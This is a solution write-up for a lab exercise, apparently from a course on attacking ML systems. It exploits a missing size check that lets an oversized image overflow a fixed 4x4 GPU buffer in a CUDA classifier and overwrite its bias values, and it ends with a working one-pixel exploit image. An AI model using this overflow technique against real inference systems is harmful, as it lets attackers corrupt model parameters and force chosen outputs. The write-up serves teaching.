'''
Solution to Exercise:

1. We need to identify the security hole, so that we know what we are actually
   trying to exploit. The first thing we notice is that the image size check
   is faulty:

    image = misc.imread('X_GPUOverflow/testimage.png')
    width, height = image.shape

    maxWidth = 4

    if width != height:
        print("Image must be square in size and maximum 4x4!")
        exit()

   The maximum width isn't checked. We can thus input any image size. So let's
   look at the CUDA code, if there is anything we can exploit on the GPU. Here we
   find, that

    // Lighten the image a bit...
    for(int i=0; i<(imgSize * imgSize); i++)
    {
        prcImg[i] = newImg[i] + 0.1;
    }

   the image is preprocessed and copied, but using the size of the input image!
   However, the processed image is always of size 4x4 --> Buffer overflow!

2. Next, we have to decide what to do. We want to do a simple last layer attack
   and overwrite the biases. Can we do that? Luckily, the memory for the biases is
   located after our image!

    gpuImage = cuda.mem_alloc(linearizedImage.size * linearizedImage.dtype.itemsize)
    gpuProcessedImage = cuda.mem_alloc(processedImage.size * processedImage.dtype.itemsize)
    [...]
    gpuWeights = cuda.mem_alloc(weights.size * weights.dtype.itemsize)
    gpuBiases = cuda.mem_alloc(biases.size * biases.dtype.itemsize)

3. Now we have to find the correct spot to overwrite. Sadly, we have all floats and
   can't do our standard 'AABBCCDD' kind of guessing. Instead, we'll just use a 
   ramp of floats by creating a gradient in Photoshop, or simply messing with the
   code. We could do something like this:

    width = 17
    height = 17
    perPixel = 255.0 / float(width * height)
    image = np.zeros((width, height), dtype=np.float32)

    for i in range(width):
        for j in range(height):
            image[j][i] = float(width * j + i) * perPixel

   (Note: The width=17 works on a 1060 GTX Mobile and might be different on other
          video cards!)

4. Using the above ramp, we see that [0.9858132  0.98927337] overwrite the Biases.
   IMPORTANT: Don't forget that the preprocessing has changed this value!!
              So in reality we have [0.8858132  0.88927337]
   We find the correct position by multiplying these values by (width*width)=289
   and see that the offset for the biases are 256 and 257.

5. Unlike our previous exercise, we can't write a very large bias of 1000.0, as
   all pixels are scaled to (0.0 - 1.0). So, instead, we simply set all the weights
   to 0.0 and one bias to 0.0 and the other to 1.0. But again, the preprocessor is 
   changing our values. For us this just means we have to play around with the values 
   to see what works. Turns out (who could have guessed) for our example the simplest
   case is sufficient and the working exploit is just a black image with the
   pixel at x=2;y=15 (position 257) set to white. Done.

    width = 17
    height = 17
    perPixel = 255.0 / float(width * height)
    image = np.zeros((width, height), dtype=np.float32)
    image[15][2] = 255.0

'''